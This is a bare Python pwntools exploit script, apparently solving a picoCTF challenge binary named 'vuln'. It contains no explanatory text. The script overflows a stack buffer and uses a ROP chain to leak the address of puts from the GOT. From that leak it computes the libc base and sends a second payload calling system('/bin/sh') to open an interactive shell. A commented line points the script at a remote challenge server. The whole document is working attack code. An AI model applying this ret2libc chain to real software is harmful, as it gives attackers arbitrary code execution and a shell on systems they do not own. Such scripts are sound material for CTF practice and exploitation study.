import pwn
exe = pwn.ELF("./vuln")
libc = pwn.ELF("./libc.so.6")
ld = pwn.ELF("./ld-2.27.so")

io = pwn.process('./vuln')
# io = pwn.remote('mercury.picoctf.net', 42072)
io.recvline()

offset = 136
pop_rdi = 0x0000000000400913
payload = b'A' * offset
payload += pwn.p64(pop_rdi)
payload += pwn.p64(exe.got["puts"])
payload += pwn.p64(exe.plt["puts"])
payload += pwn.p64(exe.sym["do_stuff"])

io.sendline(payload)

io.recvline()

leak = pwn.u64(io.recvline().rstrip().ljust(8, b"\x00")) 
pwn.log.info(leak)

libc_base = leak - libc.sym['puts']
libc_binsh = next(libc.search(b"/bin/sh\x00")) + libc_base
libc_system = libc.symbols['system'] + libc_base
ret = 0x000000000040052e

payload = b''
payload += b'A' *offset
payload += pwn.p64(ret)
payload += pwn.p64(pop_rdi)
payload += pwn.p64(libc_binsh)
payload += pwn.p64(libc_system)
io.sendline(payload)
io.interactive()